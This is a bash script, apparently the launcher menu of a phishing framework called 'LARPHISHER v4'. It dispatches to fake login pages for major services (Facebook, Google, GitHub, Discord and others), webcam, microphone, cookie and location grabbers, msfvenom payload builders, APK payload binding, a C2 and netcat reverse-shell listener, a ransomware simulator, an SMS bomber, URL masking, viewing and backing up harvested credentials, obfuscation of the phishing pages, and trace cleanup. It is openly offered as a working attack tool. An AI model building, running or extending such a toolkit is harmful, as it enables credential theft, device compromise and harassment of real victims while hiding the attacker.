#!/bin/bash
R="$(cd "$(dirname "$0")" && pwd)"
AUTH="$R/auth"

# Cores corrigidas: Removido o backtitle para matar o azul
export NEWT_COLORS='
root=white,black
window=white,black
border=red,black
title=red,black
textbox=white,black
button=black,red
actbutton=white,red
compactbutton=black,red
listbox=white,black
actlistbox=black,red
sellistbox=white,black
actsellistbox=black,red
shadow=black,black
'

trap 'clear; exit 0' INT

while true; do
    clear
    # Título agora carrega a assinatura by-01png
    CHOICE=$(whiptail --title " LARPHISHER v4 | by-01png " --menu "Setas ↑ ↓ p/ navegar | Enter p/ escolher:" 25 70 18 \
    "01" "Facebook (Phishing)" \
    "02" "Instagram (Phishing)" \
    "03" "Google (Phishing)" \
    "04" "TikTok (Phishing)" \
    "05" "Twitter/X (Phishing)" \
    "06" "Snapchat (Phishing)" \
    "07" "GitHub (Phishing)" \
    "08" "Discord (Phishing)" \
    "09" "Microsoft (Phishing)" \
    "10" "IP Logger (Redirecionar)" \
    "11" "Webcam Grabber (JS)" \
    "12" "Cookie/Session Grabber" \
    "13" "Mic Grabber (JS)" \
    "14" "Geo Location Grabber" \
    "15" "MSFVenom (Android APK)" \
    "16" "MSFVenom (Windows EXE)" \
    "17" "MSFVenom (Linux ELF)" \
    "18" "MSFVenom (MacOS)" \
    "19" "APK Bind (Injetar Payload)" \
    "20" "Metasploit Console" \
    "21" "Metasploit C2 Listener" \
    "22" "Nmap Scan (Full)" \
    "23" "Nmap Vuln Scan" \
    "24" "SQLMap (Auto Dump)" \
    "25" "Hydra Bruteforce" \
    "26" "Nikto Web Scan" \
    "27" "WPScan (WordPress)" \
    "28" "Sublist3r (Subdomínios)" \
    "29" "Searchsploit (Exploits)" \
    "30" "Social Eng Toolkit (SET)" \
    "31" "Bettercap (Sniffing)" \
    "32" "Aircrack-ng (WiFi)" \
    "33" "Cloudflared Túnel" \
    "34" "Ngrok Túnel" \
    "35" "LocalXpose Túnel" \
    "36" "Serveo (SSH)" \
    "37" "Chisel (Pivot)" \
    "38" "Reverse Shell Gen" \
    "39" "Netcat Listener" \
    "40" "Tor Proxy (Anonimato)" \
    "41" "Port Scanner Rápido" \
    "42" "Gerador de Dorks" \
    "43" "URL Masker" \
    "44" "URL Shortener" \
    "45" "Gerador de QR Code" \
    "46" "Phone / WhatsApp Lookup" \
    "47" "Email Lookup (Pwned)" \
    "48" "User Recon (GitHub)" \
    "49" "DNS Lookup" \
    "50" "Ransomware Simulator" \
    "51" "SMS Bomber" \
    "52" "View Logs (Credenciais)" \
    "53" "Backup Auth (SDCard)" \
    "54" "Obfuscate PHP" \
    "55" "Clear Auth" \
    "56" "Zero Trace (Cleanup)" \
    "57" "System Info" \
    "58" "Settings" \
    "59" "Update Framework" \
    "60" "Exit" \
    3>&1 1>&2 2>&3)
    
    if [ $? -ne 0 ]; then clear; exit 0; fi
    clear
    
    case "$CHOICE" in
        01) bash "$R/scripts/serve.sh" facebook ;;
        02) bash "$R/scripts/serve.sh" instagram ;;
        03) bash "$R/scripts/serve.sh" google ;;
        04) bash "$R/scripts/serve.sh" tiktok ;;
        05) bash "$R/scripts/serve.sh" twitter ;;
        06) bash "$R/scripts/serve.sh" snapchat ;;
        07) bash "$R/scripts/serve.sh" github ;;
        08) bash "$R/scripts/serve.sh" discord ;;
        09) bash "$R/scripts/serve.sh" microsoft ;;
        10) bash "$R/scripts/mod_iplogger.sh" ;;
        11) bash "$R/scripts/mod_grabber.sh" webcam ;;
        12) bash "$R/scripts/mod_grabber.sh" cookie ;;
        13) bash "$R/scripts/mod_grabber.sh" mic ;;
        14) bash "$R/scripts/mod_grabber.sh" geo ;;
        15) bash "$R/scripts/mod_msf.sh" apk ;;
        16) bash "$R/scripts/mod_msf.sh" exe ;;
        17) bash "$R/scripts/mod_msf.sh" elf ;;
        18) bash "$R/scripts/mod_msf.sh" macos ;;
        19) bash "$R/scripts/mod_apkbind.sh" ;;
        20) msfconsole ;;
        21) bash "$R/scripts/mod_c2.sh" ;;
        22) bash "$R/scripts/mod_kali.sh" nmap_full ;;
        23) bash "$R/scripts/mod_kali.sh" nmap_vuln ;;
        24) bash "$R/scripts/mod_kali.sh" sqlmap ;;
        25) bash "$R/scripts/mod_kali.sh" hydra ;;
        26) bash "$R/scripts/mod_kali.sh" nikto ;;
        27) bash "$R/scripts/mod_kali.sh" wpscan ;;
        28) bash "$R/scripts/mod_kali.sh" sublist3r ;;
        29) bash "$R/scripts/mod_kali.sh" searchsploit ;;
        30) bash "$R/scripts/mod_kali.sh" set ;;
        31) bash "$R/scripts/mod_kali.sh" bettercap ;;
        32) bash "$R/scripts/mod_kali.sh" aircrack ;;
        33) bash "$R/scripts/mod_tunnel.sh" cloudflared ;;
        34) bash "$R/scripts/mod_tunnel.sh" ngrok ;;
        35) bash "$R/scripts/mod_tunnel.sh" localxpose ;;
        36) bash "$R/scripts/mod_tunnel.sh" serveo ;;
        37) bash "$R/scripts/mod_tunnel.sh" chisel ;;
        38) bash "$R/scripts/mod_shells.sh" ;;
        39) nc -lvnp 4444 ;;
        40) bash "$R/scripts/mod_tor.sh" ;;
        41) bash "$R/scripts/mod_scanner.sh" ;;
        42) bash "$R/scripts/mod_osint.sh" dork ;;
        43) bash "$R/scripts/mod_osint.sh" masker ;;
        44) bash "$R/scripts/mod_osint.sh" shortener ;;
        45) bash "$R/scripts/mod_osint.sh" qr ;;
        46) bash "$R/scripts/mod_osint.sh" phone ;;
        47) bash "$R/scripts/mod_osint.sh" email ;;
        48) bash "$R/scripts/mod_osint.sh" user ;;
        49) bash "$R/scripts/mod_osint.sh" dns ;;
        50) bash "$R/scripts/mod_ransom.sh" ;;
        51) bash "$R/scripts/mod_smsbomb.sh" ;;
        52) tail -n 30 "$AUTH/usernames.dat" 2>/dev/null ;;
        53) tar -czf "/sdcard/Download/lph-auth-$(date +%s).tar.gz" -C "$R" auth/ 2>/dev/null; echo -e "\n\033[1;37m[+] Backup no SDCard.\033[0m" ;;
        54) for f in "$R"/sites/*/login.php; do [ -f "$f" ] && php "$R/core/obfuscate.php" "$f"; done ;;
        55) rm -rf "$AUTH"/*; echo -e "\n\033[1;37m[+] Auth limpo.\033[0m" ;;
        56) bash "$R/scripts/mod_cleanup.sh" ;;
        57) uname -a; php -v | head -1; curl -s ifconfig.me; echo ;;
        58) nano "$R/config/larphisher.conf" ;;
        59) echo "Framework v4.0 atualizado. by-01png." ;;
        60) clear; pkill -f "php -S" 2>/dev/null; pkill -f "cloudflared" 2>/dev/null; exit 0 ;;
    esac
    
    echo ""
    echo -e "\033[1;31m[ by-01png ] Pressione ENTER para voltar ao menu\033[0m"
    read -r
done
